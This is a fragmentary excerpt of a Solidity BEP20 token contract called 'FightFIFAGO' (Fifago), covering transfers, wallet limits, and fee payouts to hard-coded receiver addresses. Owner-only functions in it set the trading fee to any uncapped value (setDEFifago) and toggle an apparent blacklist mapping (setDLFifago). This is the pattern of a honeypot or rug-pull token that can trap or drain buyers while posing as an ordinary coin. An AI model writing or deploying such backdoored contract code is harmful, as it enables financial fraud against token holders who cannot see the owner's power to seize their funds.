...
contract Fifago is IBEP20, Auth {
    ...
    string constant _name = "FightFIFAGO";
    string constant _symbol = "Fifago";
    ...
    address private marketingFeeReceiver = 0x5396747f963B7C9Ae415AeE03e74beB61519C301;
    address private buybackFeeReceiver = 0x5396747f963B7C9Ae415AeE03e74beB61519C301;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Fifago seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Fifago seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Fifago Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Fifago TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Fifago receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Fifago receiver rejected ETH transfer");
    ...
    function setDLFifago(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEFifago(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenFifago(address _token) public authorized {
        require(_token != address(this), "Fifago Can't let you take all native token");
    ...
    function isOverLiquifiedFifago(uint256 target, uint256 accuracy) public view returns (bool) {
